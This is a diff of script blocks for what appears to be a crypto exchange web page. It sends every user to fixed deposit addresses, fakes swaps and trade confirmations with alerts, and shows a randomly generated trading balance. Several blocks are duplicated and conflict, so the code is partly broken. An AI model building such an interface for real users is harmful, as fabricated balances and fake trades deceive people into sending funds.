+    }
+
+    async function loadBalances() {
+      document.getElementById("bnbBalance").textContent = "Loading...";
+      const bnbBalance = await provider.getBalance(userAddress);
+      const bnb = ethers.utils.formatEther(bnbBalance);
+      document.getElementById("bnbBalance").textContent = `${bnb} BNB`;
+
+      const usdtAbi = ["function balanceOf(address) view returns (uint)"];
+      const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+      const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+      const usdtBalance = await usdtContract.balanceOf(userAddress);
+      const usdt = ethers.utils.formatUnits(usdtBalance, 18);
+      document.getElementById("usdtBalance").textContent = `${usdt} USDT`;
+
+      updateTotalAssets(bnb, usdt);
+    }
+
+    async function updateTotalAssets(bnb, usdt) {
+      try {
+        const res = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,tether&vs_currencies=usd");
+        const bnbUsd = res.data.binancecoin.usd;
+        const usdtUsd = res.data.tether.usd;
+        const total = (bnb * bnbUsd) + (usdt * usdtUsd);
+        document.getElementById("totalAssets").textContent = `$${total.toFixed(2)}`;
+      } catch (err) {
+        document.getElementById("totalAssets").textContent = "Error fetching prices";
+      }
+    }
+  </script> 
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script><script>
+  const addresses = {
+    ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
+    BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+    USDT_TRON: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
+  };
+
+  function updateReceiveDisplay(asset) {
+    const address = addresses[asset];
+    const container = document.getElementById('receiveAddress');
+    container.innerText = address;
+    generateQRCode(address);
+  }
+
+  function generateQRCode(value) {
+    const qrContainer = document.getElementById('qrCodeContainer');
+    qrContainer.innerHTML = "";
+    QRCode.toCanvas(document.createElement('canvas'), value, { width: 140 }, function (err, canvas) {
+      if (!err) qrContainer.appendChild(canvas);
+    });
+  }
+
+  function copyToClipboard(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      alert(`Copied to clipboard:\n${text}`);
+    }).catch(err => {
+      alert('Failed to copy text: ' + err);
+    });
+  }
+
+  document.getElementById("assetSelector").addEventListener("change", (e) => {
+    updateReceiveDisplay(e.target.value);
+  });
+
+  document.addEventListener("DOMContentLoaded", () => {
+    updateReceiveDisplay("ETH");
+    loadTradingViewChart();
+  });
+
+  function loadTradingViewChart() {
+    if (!document.getElementById("tradingview_chart").innerHTML.trim()) {
+      new TradingView.widget({
+        container_id: "tradingview_chart",
+        width: "100%",
+        height: 400,
+        symbol: "COINBASE:ETHUSD",
+        interval: "D",
+        timezone: "Etc/UTC",
+        theme: "dark",
+        style: "1",
+        locale: "en",
+        toolbar_bg: "#0b0e11",
+        enable_publishing: false,
+        hide_top_toolbar: true,
+        allow_symbol_change: true,
+        save_image: false,
+      });
+    }
+  }
+</script>
+<script>
+const currencySelector = document.getElementById("currencySelector");
+const languageSelector = document.getElementById("languageSelector");
+const walletStatus = document.getElementById("walletStatus");
+const toast = document.getElementById("toast");
+
+// Populate currencies and languages
+const currencies = ["USD", "EUR", "CAD", "INR", "PKR", "AED"];
+const languages = { en: "English", fr: "Français", es: "Español", de: "Deutsch" };
+
+// Set user defaults
+const userLang = navigator.language.split("-")[0] || "en";
+const userCurrency = Intl.NumberFormat().resolvedOptions().currency || "USD";
+
+// Load selectors
+Object.entries(languages).forEach(([code, name]) => {
+  const opt = new Option(name, code);
+  if (code === userLang) opt.selected = true;
+  languageSelector.appendChild(opt);
+});
+
+currencies.forEach((curr) => {
+  const opt = new Option(curr, curr);
+  if (curr === userCurrency) opt.selected = true;
+  currencySelector.appendChild(opt);
+});
+
+// Toast display
+function showToast(msg) {
+  toast.textContent = msg;
+  toast.classList.remove("hidden");
+  setTimeout(() => toast.classList.add("hidden"), 10000);
+}
+
+// Sound & Vibration Feedback
+function feedback() {
+  try {
+    new Audio("https://actions.google.com/sounds/v1/cartoon/pop.ogg").play();
+    if (navigator.vibrate) navigator.vibrate(100);
+  } catch (e) {}
+}
+
+// Wallet Connect Simulation
+async function connectWallet() {
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+    walletStatus.innerText = `🔌 Wallet: ${address.slice(0, 6)}...${address.slice(-4)}`;
+    showToast(`Wallet connected: ${address}`);
+    feedback();
+    getBalances(provider, address);
+  } catch (e) {
+    showToast("Wallet connection failed");
+  }
+}
+
+// Balance fetch
+async function getBalances(provider, address) {
+  try {
+    const bnbBal = await provider.getBalance(address);
+    const usdt = new ethers.Contract(
+      "0x55d398326f99059fF775485246999027B3197955", // USDT BEP20
+      ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
+      provider
+    );
+
+    const usdtBal = await usdt.balanceOf(address);
+    const decimals = await usdt.decimals();
+
+    const bnb = ethers.utils.formatEther(bnbBal);
+    const usdtAmount = Number(usdtBal) / 10 ** decimals;
+
+    document.getElementById("bnbBalance").innerText = parseFloat(bnb).toFixed(4);
+    document.getElementById("usdtBalance").innerText = usdtAmount.toFixed(2);
+
+    updateTotalAssets(usdtAmount, parseFloat(bnb));
+    updateDailyGoal(usdtAmount);
+  } catch (err) {
+    showToast("Error fetching balances");
+  }
+}
+
+// Convert to selected currency
+async function updateTotalAssets(usdt, bnb) {
+  const currency = currencySelector.value;
+  const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,tether&vs_currencies=${currency.toLowerCase()}`);
+  const data = await res.json();
+
+  const bnbRate = data.binancecoin[currency.toLowerCase()];
+  const usdtRate = data.tether[currency.toLowerCase()];
+  const total = usdt * usdtRate + bnb * bnbRate;
+
+  document.getElementById("totalAssets").innerText = `${currency} ${total.toFixed(2)}`;
+}
+
+// Goal Chart
+function updateDailyGoal(usdt) {
+  const goal = 150;
+  const progress = Math.min((usdt / goal) * 100, 100);
+  document.getElementById("dailyGoalProgress").style.width = `${progress}%`;
+}
+
+// Auto connect on load
+window.addEventListener("load", () => {
+  if (window.ethereum) {
+    connectWallet();
+  } else {
+    walletStatus.innerText = "🔌 Wallet: MetaMask not found";
+  }
+});
+</script>
+  <script>
+function showPage(pageId) {
+  const current = document.querySelector('.page:not(.hidden)');
+  const next = document.getElementById(pageId);
+  if (current && next && current !== next) {
+    current.classList.add('opacity-0');
+    setTimeout(() => {
+      current.classList.add('hidden');
+      current.classList.remove('opacity-0');
+      next.classList.remove('hidden');
+      next.classList.add('opacity-0');
+      setTimeout(() => {
+        next.classList.remove('opacity-0');
+      }, 50);
+    }, 300);
+  }
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.innerText = msg;
+  toast.classList.remove('hidden');
+  setTimeout(() => toast.classList.add('hidden'), 3000);
+}
+
+function copyBNBAddress() {
+  navigator.clipboard.writeText('0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130').then(() => {
+    showToast("BNB Address Copied");
+  });
+}
+
+function verifyAccessCode() {
+  const code = document.getElementById('accessCodeInput').value.trim();
+  showToast("Verifying Access Code...");
+  setTimeout(() => {
+    if (code === "123456") {
+      showPage('page14');
+    } else {
+      showPage('page11');
+    }
+  }, 2000);
+}
+
+window.onload = () => {
+  const canvas = document.getElementById('accessQr');
+  if (canvas && window.QRCode) {
+    new QRCode(canvas, {
+      text: "AccessCode:123456",
+      width: 128,
+      height: 128,
+      colorDark: "#ffffff",
+      colorLight: "#0b0e11",
+    });
+  }
+}
+  </script>
+  <script>
+const tokens = [
+  { symbol: "BTC", name: "Bitcoin", logo: "https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=026", tvTicker: "BINANCE:BTCUSDT" },
+  { symbol: "USDT", name: "Tether", logo: "https://cryptologos.cc/logos/tether-usdt-logo.png?v=026", tvTicker: "BINANCE:USDTUSDT" },
+  { symbol: "BNB", name: "Binance Coin", logo: "https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=026", tvTicker: "BINANCE:BNBUSDT" },
+  { symbol: "ETH", name: "Ethereum", logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png?v=026", tvTicker: "BINANCE:ETHUSDT" },
+  { symbol: "SOL", name: "Solana", logo: "https://cryptologos.cc/logos/solana-sol-logo.png?v=026", tvTicker: "BINANCE:SOLUSDT" },
+  { symbol: "USDC", name: "USD Coin", logo: "https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=026", tvTicker: "BINANCE:USDCUSDT" },
+  // Add more tokens here A-Z
+];
+
+function renderTokenList() {
+  const list = document.getElementById("tokenList");
+  list.innerHTML = "";
+  tokens.forEach(token => {
+    const row = document.createElement("div");
+    row.className = "flex justify-between items-center p-3 mb-2 bg-[#0f375a] rounded-lg cursor-pointer hover:bg-[#15527e]";
+    row.onclick = () => showTokenDetails(token);
+    row.innerHTML = `
+      <div class="flex items-center gap-4">
+        <img src="${token.logo}" alt="${token.name}" class="w-8 h-8"/>
+        <div class="text-white">
+          <div class="font-semibold">${token.symbol}</div>
+          <div class="text-sm text-gray-400">${token.name}</div>
+        </div>
+      </div>
+      <div id="price-${token.symbol}" class="text-green-400">--</div>
+    `;
+    list.appendChild(row);
+  });
+}
+
+function filterTokens() {
+  const keyword = document.getElementById("tokenSearch").value.toLowerCase();
+  const allRows = document.querySelectorAll("#tokenList > div");
+  allRows.forEach(row => {
+    row.style.display = row.textContent.toLowerCase().includes(keyword) ? "flex" : "none";
+  });
+}
+
+function showTokenDetails(token) {
+  document.getElementById("tokenTitle").innerText = token.name;
+  document.getElementById("priceWidget").innerHTML = `
+    <iframe src="https://www.tradingview.com/widgetembed/?symbol=${token.tvTicker}&interval=60&theme=dark&style=1&locale=en" width="100%" height="400" frameborder="0"></iframe>
+  `;
+  navigateTo("page6i");
+}
+
+function fetchLivePrices() {
+  fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,tether,binancecoin,ethereum,solana,usd-coin&vs_currencies=usd")
+    .then(res => res.json())
+    .then(data => {
+      tokens.forEach(token => {
+        let idMap = {
+          BTC: "bitcoin",
+          USDT: "tether",
+          BNB: "binancecoin",
+          ETH: "ethereum",
+          SOL: "solana",
+          USDC: "usd-coin"
+        };
+        const price = data[idMap[token.symbol]]?.usd;
+        if (price) document.getElementById(`price-${token.symbol}`).innerText = `$${price.toFixed(2)}`;
+      });
+    });
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  renderTokenList();
+  fetchLivePrices();
+});
+   </script>
+<script>
+  // === LANGUAGE AND CURRENCY DETECTION & TRANSLATION ===
+  const dictionary = {
+    en: {
+      settings: "Settings", save: "Save Settings",
+      preferred_currency: "Preferred Currency",
+      preferred_language: "Preferred Language",
+      kyc_verification: "KYC Verification",
+      view_profile: "View Profile",
+      connect_wallet: "Connect Wallet",
+      live_chat: "Live Chat Support",
+      disconnect_wallet: "Disconnect Wallet",
+      logout: "Logout",
+      faq: "FAQ", help_support: "Help & Support"
+    },
+    es: {
+      settings: "Configuraciones", save: "Guardar configuración",
+      preferred_currency: "Moneda preferida",
+      preferred_language: "Idioma preferido",
+      kyc_verification: "Verificación KYC",
+      view_profile: "Ver perfil",
+      connect_wallet: "Conectar billetera",
+      live_chat: "Soporte de chat en vivo",
+      disconnect_wallet: "Desconectar billetera",
+      logout: "Cerrar sesión",
+      faq: "Preguntas frecuentes", help_support: "Ayuda y soporte"
+    },
+    fr: {
+      settings: "Paramètres", save: "Enregistrer les paramètres",
+      preferred_currency: "Devise préférée",
+      preferred_language: "Langue préférée",
+      kyc_verification: "Vérification KYC",
+      view_profile: "Voir le profil",
+      connect_wallet: "Connecter le portefeuille",
+      live_chat: "Support Chat en direct",
+      disconnect_wallet: "Déconnecter le portefeuille",
+      logout: "Se déconnecter",
+      faq: "FAQ", help_support: "Aide et assistance"
+    }
+    // Add other languages as needed
+  };
+
+  async function detectLanguageAndCurrency() {
+    const langSelect = document.getElementById("languageSelect");
+    const currencySelect = document.getElementById("currencySelect");
+    const countryText = document.getElementById("detectedCountry");
+    const contentElements = document.querySelectorAll("[data-translate]");
+
+    const languages = [
+      { code: "en", label: "English" },
+      { code: "ar", label: "العربية" },
+      { code: "de", label: "Deutsch" },
+      { code: "es", label: "Español" },
+      { code: "fr", label: "Français" },
+      { code: "hi", label: "हिंदी" },
+      { code: "ja", label: "日本語" },
+      { code: "ru", label: "Русский" },
+      { code: "zh", label: "中文" }
+    ];
+
+    const currencies = [
+      "AED", "AUD", "CAD", "CHF", "CNY", "EUR", "GBP", "HKD", "INR",
+      "JPY", "KRW", "MXN", "NOK", "NZD", "RUB", "SAR", "SEK", "SGD",
+      "TRY", "USD", "ZAR"
+    ].sort();
+
+    langSelect.innerHTML = languages.map(l => `<option value="${l.code}">${l.label}</option>`).join('');
+    currencySelect.innerHTML = currencies.map(c => `<option value="${c}">${c}</option>`).join('');
+
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const geo = await res.json();
+      const detectedCurrency = geo.currency || "USD";
+      const detectedCountry = geo.country_name || "Unknown";
+      const browserLang = (navigator.language || "en").split("-")[0];
+
+      langSelect.value = languages.some(l => l.code === browserLang) ? browserLang : "en";
+      currencySelect.value = currencies.includes(detectedCurrency) ? detectedCurrency : "USD";
+      countryText.textContent = `🌍 Detected Country: ${detectedCountry} — Currency: ${detectedCurrency}`;
+
+      translatePage(langSelect.value, contentElements);
+    } catch (e) {
+      console.warn("Geolocation failed:", e);
+      countryText.textContent = "❌ Location detection failed.";
+    }
+
+    langSelect.addEventListener("change", () => {
+      translatePage(langSelect.value, contentElements);
+    });
+  }
+
+  function translatePage(lang, elements) {
+    const langDict = dictionary[lang] || dictionary["en"];
+    elements.forEach(el => {
+      const key = el.dataset.translate;
+      el.textContent = langDict[key] || dictionary.en[key] || key;
+    });
+  }
+
+  // === SAVE SETTINGS ===
+  function saveSettings() {
+    const language = document.getElementById("languageSelect")?.value || "en";
+    const currency = document.getElementById("currencySelect")?.value || "USD";
+    alert(`✅ Settings saved:\nLanguage: ${language}\nCurrency: ${currency}`);
+  }
+
+  // === FEEDBACK PLACEHOLDER ===
+  function feedback() {
+    console.log("⚙️ Settings option clicked.");
+  }
+
+  // === DOM READY INITIALIZATION ===
+  window.addEventListener("DOMContentLoaded", () => {
+    updateNavVisibility();
+    detectLanguageAndCurrency();
+    showPage("page0");
+  });
+      </script>
+    <script>
+  const pageHistory = [];
+
+  function showPage(pageNumber) {
+    document.querySelectorAll('.page').forEach((page) => {
+      page.classList.add('hidden');
+      page.classList.remove('active');
+    });
+
+    const targetPage = document.getElementById(`page${pageNumber}`);
+    if (targetPage) {
+      targetPage.classList.remove('hidden');
+      targetPage.classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+
+      if (!pageHistory.includes(`page${pageNumber}`)) {
+        pageHistory.push(`page${pageNumber}`);
+      }
+    } else {
+      console.error(`Page with id "page${pageNumber}" not found.`);
+    }
+  }
+
+  function goBack() {
+    if (pageHistory.length > 1) {
+      pageHistory.pop(); // remove current
+      const previousPage = pageHistory[pageHistory.length - 1];
+      const previousNumber = previousPage.replace("page", "");
+      showPage(previousNumber);
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    showPage(0); // Default to Landing Page (page0)
+  });
+
+  // Optional: Add this function to handle navigation buttons
+  document.querySelectorAll('[data-goto]').forEach((btn) => {
+    btn.addEventListener('click', (e) => {
+      const target = e.currentTarget.getAttribute('data-goto');
+      if (target) showPage(target);
+    });
+  });
+    </script>
+
+  <script>
+  function openWalletModal() {
+    document.getElementById('walletModal').classList.remove('hidden');
+  }
+
+  function closeWalletModal() {
+    document.getElementById('walletModal').classList.add('hidden');
+  }
+
+  document.getElementById('connectWalletBtn').addEventListener('click', () => {
+    const selectedChain = document.getElementById('chainSelect').value;
+    alert(`Connecting to wallet on ${selectedChain.toUpperCase()} network...`);
+    closeWalletModal();
+    // TODO: Add real wallet connect logic with ethers.js or other libs here, using selectedChain
+  });
+
+  const assets = [
+    { name: 'Bitcoin (BTC)', symbol: 'BTC', balance: 0.453, price: 64000 },
+    { name: 'Ethereum (ETH)', symbol: 'ETH', balance: 3.2, price: 3100 },
+    { name: 'Tether (USDT)', symbol: 'USDT', balance: 1000, price: 1 },
+  ];
+
+  const assetListElem = document.getElementById('assetList');
+  const recentTransactionsElem = document.getElementById('recentTransactions');
+  const portfolioTotalElem = document.getElementById('portfolioTotal');
+  const btcBalanceElem = document.getElementById('btcBalance');
+  const ethBalanceElem = document.getElementById('ethBalance');
+
+  function updateAssets() {
+    let total = 0;
+    assetListElem.innerHTML = '';
+    assets.forEach(asset => {
+      const value = asset.balance * asset.price;
+      total += value;
+      assetListElem.innerHTML += `
+        <tr class="border-t border-gray-700">
+          <td class="py-3">${asset.name}</td>
+          <td>${asset.balance.toFixed(4)} ${asset.symbol}</td>
+          <td>$${value.toLocaleString()}</td>
+        </tr>`;
+    });
+    portfolioTotalElem.innerText = `$${total.toLocaleString()}`;
+    btcBalanceElem.innerText = `${assets[0].balance} BTC`;
+    ethBalanceElem.innerText = `${assets[1].balance} ETH`;
+  }
+
+  function updateRecentTransactions() {
+    recentTransactionsElem.innerHTML = `
+      <li class="flex justify-between">
+        <span>Received BTC</span>
+        <span class="text-green-400">+0.02 BTC</span>
+      </li>
+      <li class="flex justify-between">
+        <span>Sent ETH</span>
+        <span class="text-red-400">-1.0 ETH</span>
+      </li>
+    `;
+  }
+
+  updateAssets();
+  updateRecentTransactions();
+
+  // Portfolio chart setup
+  const ctx = document.getElementById('portfolioChart').getContext('2d');
+  const portfolioChart = new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: ['Jun', 'Jul', 'Aug'],
+      datasets: [{
+        label: 'Portfolio Value',
+        data: [8000, 11000, assets.reduce((sum, a) => sum + a.balance * a.price, 0)],
+        borderColor: 'rgba(255, 215, 0, 1)',
+        backgroundColor: 'rgba(255, 215, 0, 0.2)',
+        fill: true,
+        tension: 0.3
+      }]
+    },
+    options: {
+      scales: {
+        y: { beginAtZero: false }
+      }
+    }
+  });
+</script>
+
+<script>
+// Tab switch between Buy / Sell
+document.getElementById("buyTab").addEventListener("click", () => {
+  setTradeTab("buy");
+});
+document.getElementById("sellTab").addEventListener("click", () => {
+  setTradeTab("sell");
+});
+
+function setTradeTab(tab) {
+  const buyBtn = document.getElementById("buyTab");
+  const sellBtn = document.getElementById("sellTab");
+  if (tab === "buy") {
+    buyBtn.classList.add("active-tab");
+    sellBtn.classList.remove("active-tab");
+  } else {
+    sellBtn.classList.add("active-tab");
+    buyBtn.classList.remove("active-tab");
+  }
+}
+
+// Simulated estimate calculation
+const tradeForm = document.getElementById("tradeForm");
+const outputElem = document.getElementById("estimatedOutput");
+const assetSelector = document.getElementById("assetSelector");
+
+tradeForm.addEventListener("input", () => {
+  const amount = parseFloat(tradeForm.querySelector("input[type='number']").value);
+  const asset = assetSelector.value;
+  let rate = 0;
+
+  switch (asset) {
+    case "BTC": rate = 60000; break;
+    case "ETH": rate = 3500; break;
+    case "USDT": rate = 1; break;
+    case "BNB": rate = 500; break;
+  }
+
+  const result = amount / rate;
+  outputElem.innerText = `${result.toFixed(5)} ${asset}`;
+});
+
+tradeForm.addEventListener("submit", (e) => {
+  e.preventDefault();
+  alert("Transaction submitted.");
+});
+</script>
+
+<!-- Scripts -->
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+<script>
+  const addresses = {
+    ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
+    BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+    USDT_TRON: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
+  };
+
+  function updateReceiveDisplay(asset) {
+    const address = addresses[asset];
+    const container = document.getElementById('receiveAddress');
+    container.innerText = address;
+    generateQRCode(address);
+  }
+
+  function generateQRCode(value) {
+    const qrContainer = document.getElementById('qrCodeContainer');
+    qrContainer.innerHTML = "";
+    QRCode.toCanvas(document.createElement('canvas'), value, { width: 140 }, function (err, canvas) {
+      if (!err) qrContainer.appendChild(canvas);
+    });
+  }
+
+  function copyToClipboard(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      alert(`Copied to clipboard:\n${text}`);
+    }).catch(err => {
+      alert('Failed to copy text: ' + err);
+    });
+  }
+
+  document.getElementById("assetSelector").addEventListener("change", (e) => {
+    updateReceiveDisplay(e.target.value);
+  });
+
+  document.addEventListener("DOMContentLoaded", () => {
+    updateReceiveDisplay("ETH");
+    loadTradingViewChart();
+  });
+
+  function loadTradingViewChart() {
+    if (!document.getElementById("tradingview_chart").innerHTML.trim()) {
+      new TradingView.widget({
+        container_id: "tradingview_chart",
+        width: "100%",
+        height: 400,
+        symbol: "COINBASE:ETHUSD",
+        interval: "D",
+        timezone: "Etc/UTC",
+        theme: "dark",
+        style: "1",
+        locale: "en",
+        toolbar_bg: "#0b0e11",
+        enable_publishing: false,
+        hide_top_toolbar: true,
+        allow_symbol_change: true,
+        save_image: false,
+      });
+    }
+  }
+</script>
+<script src="https://s3.tradingview.com/tv.js"></script>
+  <script type="text/javascript">
+  new TradingView.widget({
+    "container_id": "tradingview_chart",
+    "autosize": true,
+    "symbol": "BINANCE:BNBUSDT",
+    "interval": "30",
+    "timezone": "Etc/UTC",
+    "theme": "dark",
+    "style": "1",
+    "locale": "en",
+    "toolbar_bg": "#0b0e11",
+    "enable_publishing": false,
+    "hide_legend": false,
+    "hide_side_toolbar": false,
+    "save_image": false
+  });
+</script>
+<script>
+const currencySelector = document.getElementById("currencySelector");
+const languageSelector = document.getElementById("languageSelector");
+const walletStatus = document.getElementById("walletStatus");
+const toast = document.getElementById("toast");
+
+// Populate currencies and languages
+const currencies = ["USD", "EUR", "CAD", "INR", "PKR", "AED"];
+const languages = { en: "English", fr: "Français", es: "Español", de: "Deutsch" };
+
+// Set user defaults
+const userLang = navigator.language.split("-")[0] || "en";
+const userCurrency = Intl.NumberFormat().resolvedOptions().currency || "USD";
+
+// Load selectors
+Object.entries(languages).forEach(([code, name]) => {
+  const opt = new Option(name, code);
+  if (code === userLang) opt.selected = true;
+  languageSelector.appendChild(opt);
+});
+
+currencies.forEach((curr) => {
+  const opt = new Option(curr, curr);
+  if (curr === userCurrency) opt.selected = true;
+  currencySelector.appendChild(opt);
+});
+
+// Toast display
+function showToast(msg) {
+  toast.textContent = msg;
+  toast.classList.remove("hidden");
+  setTimeout(() => toast.classList.add("hidden"), 10000);
+}
+
+// Sound & Vibration Feedback
+function feedback() {
+  try {
+    new Audio("https://actions.google.com/sounds/v1/cartoon/pop.ogg").play();
+    if (navigator.vibrate) navigator.vibrate(100);
+  } catch (e) {}
+}
+
+// Wallet Connect Simulation
+async function connectWallet() {
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+    walletStatus.innerText = `🔌 Wallet: ${address.slice(0, 6)}...${address.slice(-4)}`;
+    showToast(`Wallet connected: ${address}`);
+    feedback();
+    getBalances(provider, address);
+  } catch (e) {
+    showToast("Wallet connection failed");
+  }
+}
+
+// Balance fetch
+async function getBalances(provider, address) {
+  try {
+    const bnbBal = await provider.getBalance(address);
+    const usdt = new ethers.Contract(
+      "0x55d398326f99059fF775485246999027B3197955", // USDT BEP20
+      ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
+      provider
+    );
+
+    const usdtBal = await usdt.balanceOf(address);
+    const decimals = await usdt.decimals();
+
+    const bnb = ethers.utils.formatEther(bnbBal);
+    const usdtAmount = Number(usdtBal) / 10 ** decimals;
+
+    document.getElementById("bnbBalance").innerText = parseFloat(bnb).toFixed(4);
+    document.getElementById("usdtBalance").innerText = usdtAmount.toFixed(2);
+
+    updateTotalAssets(usdtAmount, parseFloat(bnb));
+    updateDailyGoal(usdtAmount);
+  } catch (err) {
+    showToast("Error fetching balances");
+  }
+}
+
+// Convert to selected currency
+async function updateTotalAssets(usdt, bnb) {
+  const currency = currencySelector.value;
+  const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,tether&vs_currencies=${currency.toLowerCase()}`);
+  const data = await res.json();
+
+  const bnbRate = data.binancecoin[currency.toLowerCase()];
+  const usdtRate = data.tether[currency.toLowerCase()];
+  const total = usdt * usdtRate + bnb * bnbRate;
+
+  document.getElementById("totalAssets").innerText = `${currency} ${total.toFixed(2)}`;
+}
+
+// Goal Chart
+function updateDailyGoal(usdt) {
+  const goal = 150;
+  const progress = Math.min((usdt / goal) * 100, 100);
+  document.getElementById("dailyGoalProgress").style.width = `${progress}%`;
+}
+
+// Auto connect on load
+window.addEventListener("load", () => {
+  if (window.ethereum) {
+    connectWallet();
+  } else {
+    walletStatus.innerText = "🔌 Wallet: MetaMask not found";
+  }
+});
+</script>
+
+    <script>
+    // Placeholder prices for demo (in USD)
+    const prices = {
+      USDT: 1,
+      BNB: 330,
+      BTC: 28000,
+      ETH: 1900,
+      BCH: 230,
+      LTC: 85,
+      XLM: 0.10,
+      MATIC: 1.2,
+      DOGE: 0.065,
+      ADA: 0.42,
+      SOL: 20,
+      AVAX: 18,
+      DOT: 6,
+      TRX: 0.06,
+      SHIB: 0.00001,
+      UNI: 6,
+      LINK: 7,
+      ATOM: 13,
+      ETC: 18,
+      FTM: 0.5,
+      NEAR: 2,
+      HBAR: 0.05,
+      ALGO: 0.15,
+      CRO: 0.20,
+      EGLD: 45,
+      VET: 0.02,
+      ZIL: 0.02,
+      AAVE: 70,
+      CAKE: 4,
+      SAND: 1.1,
+      MANA: 0.8,
+      AXS: 15,
+      GALA: 0.03,
+      APE: 6,
+      RNDR: 2.5,
+      DYDX: 4,
+      "1INCH": 1,
+      LRC: 0.7,
+      BAND: 4,
+      ENS: 14,
+      CHZ: 0.15,
+      COMP: 70,
+      RUNE: 5,
+      GRT: 0.5,
+      TWT: 0.8,
+      BAT: 0.3,
+      ZRX: 0.5,
+      KAVA: 2,
+      XRP: 0.6,
+      FIL: 5,
+      XTZ: 1.5,
+    };
+
+    // Update estimated receive amount
+    function updateReceiveAmount() {
+      const fromToken = document.getElementById("fromToken").value;
+      const toToken = document.getElementById("toToken").value;
+      const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+
+      const usdValue = fromAmount * (prices[fromToken] || 0);
+      const receiveAmount = usdValue / (prices[toToken] || 1);
+
+      document.getElementById("receiveAmount").textContent = receiveAmount.toFixed(6);
+    }
+
+    // Handle token swap button click
+    function handleTrade() {
+      const fromToken = document.getElementById("fromToken").value;
+      const toToken = document.getElementById("toToken").value;
+      const fromAmount = parseFloat(document.getElementById("fromAmount").value);
+
+      if (!fromAmount || fromAmount <= 0) {
+        alert("Please enter a valid amount to swap.");
+        return;
+      }
+
+      if (fromToken === toToken) {
+        alert("Please select different tokens to swap.");
+        return;
+      }
+
+      alert(
+        `Swapped ${fromAmount} ${fromToken} for approximately ${document.getElementById(
+          "receiveAmount"
+        ).textContent} ${toToken}`
+      );
+
+      // Reset input
+      document.getElementById("fromAmount").value = "";
+      updateReceiveAmount();
+
+      // Update total trading balance (simulate)
+      updateTotalTradingBalance();
+    }
+
+    // Simulate updating total trading balance
+    function updateTotalTradingBalance() {
+      const randomBalance = (1000 + Math.random() * 4000).toFixed(2);
+      document.getElementById("totalTradingBalance").textContent = `$${randomBalance}`;
+    }
+
+    // Initialize UI
+    updateReceiveAmount();
+    updateTotalTradingBalance();
+
+    // Add event listeners
+    document.getElementById("fromToken").addEventListener("change", updateReceiveAmount);
+    document.getElementById("toToken").addEventListener("change", updateReceiveAmount);
+    document.getElementById("fromAmount").addEventListener("input", updateReceiveAmount);
+    </script>
+    <!-- External Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+
+  <script>
+  // === Fetch live prices from CoinGecko every 20 seconds ===
+  async function fetchSpotPrices() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin&vs_currencies=usd");
+      const data = await res.json();
+
+      document.getElementById("btcPrice").textContent = "$" + data.bitcoin.usd.toLocaleString();
+      document.getElementById("ethPrice").textContent = "$" + data.ethereum.usd.toLocaleString();
+      document.getElementById("bnbPrice").textContent = "$" + data.binancecoin.usd.toLocaleString();
+    } catch (err) {
+      console.error("Price fetch error:", err);
+    }
+  }
+  setInterval(fetchSpotPrices, 20000);
+  fetchSpotPrices();
+
+  // === Fetch wallet BNB balance from Binance Smart Chain (simulated wallet for demo) ===
+  async function fetchWalletBalances() {
+    const address = localStorage.getItem('connectedWallet');
+    if (!address) {
+      console.warn("No wallet connected");
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+      const balance = await provider.getBalance(address);
+      const bnbBalance = parseFloat(ethers.formatEther(balance));
+      localStorage.setItem('BNB_BALANCE', bnbBalance.toFixed(6));
+      console.log(`BNB balance for ${address}: ${bnbBalance.toFixed(6)}`);
+    } catch (e) {
+      console.error("Error fetching wallet balance:", e);
+    }
+  }
+
+  // For demo, simulate connected wallet & balance if none
+  if(!localStorage.getItem('connectedWallet')) {
+    localStorage.setItem('connectedWallet', '0x0000000000000000000000000000000000000000');
+    localStorage.setItem('BNB_BALANCE', '5.000000'); // 5 BNB starting balance
+  }
+
